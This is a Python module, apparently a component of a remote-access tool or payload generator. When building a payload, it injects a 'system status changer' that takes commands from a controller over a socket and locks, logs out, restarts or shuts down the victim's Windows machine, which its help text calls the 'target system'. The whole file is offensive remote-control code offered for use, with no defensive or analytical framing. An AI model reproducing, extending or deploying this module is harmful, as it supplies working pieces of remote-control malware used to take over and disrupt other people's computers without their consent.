# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('from ctypes import windll')
        self.config.import_statements.append('import os')
        self.config.functions.append('''
def system_stat(option):
    if option == 'lock':
        send_all(s,'[*]Locking user...')
        windll.user32.LockWorkStation()
    elif option == 'logout':
        send_all(s,'[*]Logging user out...')
        os.system('shutdown /l')
    elif option == 'restart':
        send_all(s,'[*]System restarting...')
        os.system('shutdown /r /t 0')
    elif option == 'shutdown':
        send_all(s,'[*]System shutting down...')
        os.system('shutdown /s /t 0')''')
        self.config.logics.append('''
            elif command in ('lock','logout','restart','shutdown'):
                system_stat(command)''')
        self.config.help_menu['lock'] = 'Allows you to gracefully lock the target system'
        self.config.help_menu['logout'] = 'Allows you to gracefully log the user out of the target system'
        self.config.help_menu['restart'] = 'Allows you to gracefully restart the target system'
        self.config.help_menu['shutdown'] = 'Allows you to gracefully shutdown the target system'
    elif option == 'info':
        self.log.blank('\nName             : System status changer component' \
                       '\nOS               : Windows' \
                       '\nRequired Modules : os, ctypes' \
                       '\nCommands         : lock, logout, restart, shutdown' \
                       '\nDescription      : Allows you to gracefully lock, logout, restart or shutdown a computer\n')
        return {
            "Name": "System status changer component",
            "OS": "Windows",
            "Required Modules": "os, ctypes",
            "Commands": "lock, logout, restart, shutdown",
            "Description": "Allows you to gracefully lock, logout, restart or shutdown a computer"}